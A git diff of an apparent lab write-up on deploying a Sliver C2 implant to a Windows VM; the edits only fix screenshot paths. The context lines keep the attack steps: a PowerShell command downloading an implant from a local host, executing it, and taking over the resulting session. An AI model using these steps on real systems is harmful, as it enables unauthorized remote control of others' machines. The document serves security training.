@@ -23,7 +23,7 @@ This section walks through deploying a Sliver implant on a Windows VM and dumpin
   IWR -Uri http://192.168.x.x/NEW_SHAKEDOWN.exe -Outfile C:\Users\localadmin\Downloads\NEW_SHAKEDOWM.exe
   ```
 
-[Implant on Windows VM](screenshot/Implant%20on%20Windows%20Vm.png)
+[Implant on Windows VM](screenshots/Implant%20on%20Windows%20Vm.png)
 
 ---
 
@@ -34,27 +34,27 @@ This section walks through deploying a Sliver implant on a Windows VM and dumpin
   http
   ```
 
-[Run Sliver](screenshot/Run%20Sliver.png)
+[Run Sliver](screenshots/Run%20Sliver.png)
 
 - Executed the implant manually on the Windows VM:
   ```powershell
   .\New_SHAKEDOWN.exe
   ```
 
-[Sliver Implant Execution](screenshot/Sliver%20implant.png)
+[Sliver Implant Execution](screenshots/Sliver%20implant.png)
 
 - Verified the callback and checked active sessions:
   ```bash
   sessions
   ```
 
-[Sliver Session](screenshot/Sliver%20Session.png)
+[Sliver Session](screenshots/Sliver%20Session.png)
 
 - Interacted with the session:
   ```bash
   use <session_id>
   ```
-[Get System](screenshot/Get%20System%20sliver.png)
+[Get System](screenshots/Get%20System%20sliver.png)
 
 [Verify Established Implant Connection](screenshots/Verify%20Established%20Implant%20Connection.png)
 
